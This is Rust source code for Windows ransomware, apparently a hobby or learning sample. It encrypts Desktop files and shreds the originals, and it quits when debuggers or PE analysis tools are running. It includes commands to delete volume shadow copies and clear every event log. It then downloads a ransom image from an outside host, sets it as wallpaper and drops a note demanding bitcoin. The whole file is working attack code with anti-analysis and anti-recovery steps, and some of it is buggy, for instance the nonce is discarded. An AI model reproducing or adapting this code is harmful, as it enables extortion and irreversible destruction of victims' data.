//extern crate request;
use std::collections::HashMap;
use std::{thread,time};
use std::{borrow::Cow};
use std::fs::File;
use aes_gcm::aead::Aead;
use heapless::{self};
use aes_gcm::{
    aead::{AeadCore, AeadInPlace, KeyInit, Key,OsRng},
    Aes256Gcm, Nonce
};
use  winapi::um::tlhelp32::*;
use std::path::Path;
use std::process::Command;
use std::process::exit;
use file_shred::shred_file;
use regex::Regex;
use walkdir::WalkDir;
use std::io::{BufReader,Write,BufWriter,Read, stdout, self};
use std::error::Error;
use error_chain::error_chain;
use std::ffi::CStr;
use reqwest::blocking::{Body,get,Client,Request};
use winapi::um::winuser::{SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER, SystemParametersInfoA};
use winapi::ctypes::c_void;
fn main(){
    
    let mut all_fs:Vec<String>=Vec::new();
    let mut cmd=Command::new("cmd.exe");
    cmd.arg("/C");
    cmd.arg("whoami");
    let mut us=cmd.output().unwrap();
    let user=String::from_utf8(us.stdout).unwrap();
    let split_string = user.split("\\").collect::<Vec<&str>>();

    for entry in WalkDir::new(format!("C:\\Users\\{}\\Desktop",split_string[1].trim())) {
        let entry=entry.unwrap();
        if entry.path().is_file(){
        let lol=entry.path().display().to_string();
    
        if lol.ends_with(".txt")||lol.ends_with(".docx")||lol.ends_with(".doc")||lol.ends_with(".pdf")||lol.ends_with(".pptx")||lol.ends_with(".xlsx")||lol.ends_with(".jpg")||lol.ends_with(".png")||lol.ends_with(".jpeg")||lol.ends_with(".bmp")||lol.ends_with(".csv")||lol.ends_with(".rar")||lol.ends_with(".mp4"){
            all_fs.push(lol);
        }
    }
    }
    ch_prcss();
    
    dl_vs();
    dl_sh();
    cl_lgs();
    
    for i in &all_fs{
        let rep = Regex::new(".txt$|.pptx$|.docx$|.doc$|.pdf$|.xlsx$|.png$|.jpg$|.jpeg$|.bmp$|.csv$|.rar$|.mp4$").unwrap();
        let rs=rep.replace(i, ".guts").to_string();
        let mut rd_file=File::open(i).unwrap();
        let mut inp_file = File::create(rs).unwrap();
        let mut reader = BufReader::new(rd_file);
        
        let mut write = BufWriter::new(inp_file);
        let mut buffer: Vec<u8> = Vec::new();
        let key = Aes256Gcm::generate_key(&mut OsRng);
        let key: &[u8; 32] = &[42; 32];
        let key: &Key<Aes256Gcm> = key.into();
        let cipher = Aes256Gcm::new(&key);
        let nonce = Aes256Gcm::generate_nonce(&mut OsRng); 
        loop{
            let mut buf = [0u8; 4096];
            let n = reader.read(&mut buf).unwrap();
            if n==0{
                break;
            }
            let mut buffer=match cipher.encrypt(&nonce,buf.as_ref()){
                Ok(p)=>p,
                Err(e)=> panic!("Error: {}", e),
            };
            write.write_all(&buffer);
            buffer.clear();
           
        }
        write.flush().unwrap();
        shred_file(Path::new(i));
    }
    ch_scn(String::from(split_string[1].trim()));

}
fn ch_prcss(){
    unsafe{
        let mut res=false;
        let process=["x64dbg.exe","x32dbg.exe","pestudio.exe","PE-bear.exe"];
         let pshandle:winapi::um::winnt::HANDLE=CreateToolhelp32Snapshot(0x00000002, 0);
         if pshandle != winapi::um::handleapi::INVALID_HANDLE_VALUE{
            let mut psentry:PROCESSENTRY32=std::mem::zeroed();
            psentry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            
            for i in &process{
                if Process32First(pshandle, &mut psentry) !=0{
                while(Process32Next(pshandle, &mut psentry)!=0){
                    let exe_file = CStr::from_ptr(psentry.szExeFile.as_ptr());
                    let exe_file_str = exe_file.to_str().unwrap();
                    
                    if(i==&exe_file_str){
                        res=true;
                        }
                     }
                }
            }
         }
        if res{
            exit(1);
        }
    }
}
fn dl_sh(){
    let mut cmd=Command::new("wmic.exe");
    cmd.arg("Shadowcopy").arg("Delete");
    
}
fn dl_vs(){
    let mut cmd=Command::new("vssadmin.exe");
    cmd.arg("Delete").arg("Shadows").arg("/all").arg("/quiet");
    

}
fn cl_lgs(){
    let mut cmd=Command::new("powershell.exe");
    cmd.arg("-command");
    cmd.arg("wevtutil").arg("el").arg("|").arg("ForEach-Object").arg("{wevtutil cl $_}");
    
}
 fn ch_scn(u:String){
    
    let client = Client::new();
    let client = get("https://i.postimg.cc/dtKMvXPH/ransomware.png").unwrap();
    let mut reader = BufReader::new(client);

    let mut file = File::create(format!("C:\\Users\\{}\\Downloads\\mal4.jpg",u)).unwrap();

    let mut buffer = [0; 1024];
    loop {
        let n = reader.read(&mut buffer).unwrap();
        if n == 0 {
            break;
        }

        file.write_all(&buffer[..n]).unwrap();
    }
    let path=format!("C:\\Users\\{}\\Downloads\\mal4.jpg",u);
    let ten_millis = time::Duration::from_millis(20000);
    let now = time::Instant::now();

    thread::sleep(ten_millis);

    assert!(now.elapsed() >= ten_millis);
    let mut inp_file = File::create(format!("C:\\Users\\{}\\Desktop\\ransom_note.txt",u)).unwrap();
    let mut writemal = BufWriter::new(inp_file);
    let mut buffer_note = String::from("Pay a ransom of 100 bitcoins to this wallet abd03jsdjskdsdsdsdsdsd to receive the private key");
    writemal.write_all(&buffer_note.as_bytes().to_vec());
    buffer_note.clear();
    writemal.flush().unwrap();
    unsafe{
        SystemParametersInfoA(
            SPI_SETDESKWALLPAPER,
            0,
            path.as_ptr() as *mut c_void,
            SPIF_UPDATEINIFILE,
        );
}
    
}